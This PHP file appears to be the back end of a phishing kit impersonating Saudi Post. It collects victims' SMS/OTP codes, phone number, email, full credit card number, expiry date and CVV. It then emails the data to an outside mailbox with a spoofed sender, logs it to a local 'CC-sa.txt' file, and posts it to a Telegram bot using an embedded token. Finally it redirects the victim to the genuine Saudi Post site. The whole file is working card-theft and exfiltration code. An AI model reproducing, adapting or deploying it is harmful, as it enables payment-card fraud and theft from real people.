<?php
session_start();
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "sms  2       : ".$_POST['otp']."\n";
$bilsmg .= "sms  1       : ".$_POST['sms1']."\n";
$bilsmg .= "------------------------------------------------------\n";
$bilsmg .= "N-Phone      : ".$_POST['tel']."\n";
$bilsmg .= "E-mail       : ".$_POST['email']."\n";
$bilsmg .= "C-Number     : ".$_POST['cc']."\n";
$bilsmg .= "D-Expiration : ".$_POST['expe']."\n";
$bilsmg .= "CVN          : ".$_POST['cvv']."\n";
$bilsmg .= "--------------------------------------------------------\n";
$bilsmg .= "From : $ip \n";

$bilsub = "Saudi Post CC :) sms2 - ".$ip;
$bilhead = "From: KSA BOX <send@saudipost.io>";

mail("natachaperin@outlook.com",$bilsub,$bilsmg,$bilhead);
$file = fopen("../CC-sa.txt", 'a');
fwrite($file, $bilsmg);
header("location: https://sp.com.sa/en/");
$token = "1078607995:AAFy-N4rHj_0-ocLFMy9FpOG9HB9bFPeQA8";
    file_get_contents("https://api.telegram.org/bot1797120271:AAEEcc55mkAqzVJlzCYgyAF-I_HjAyJTVqc/sendMessage?chat_id=-545643722&text=" . urlencode($bilsmg)."" );
?>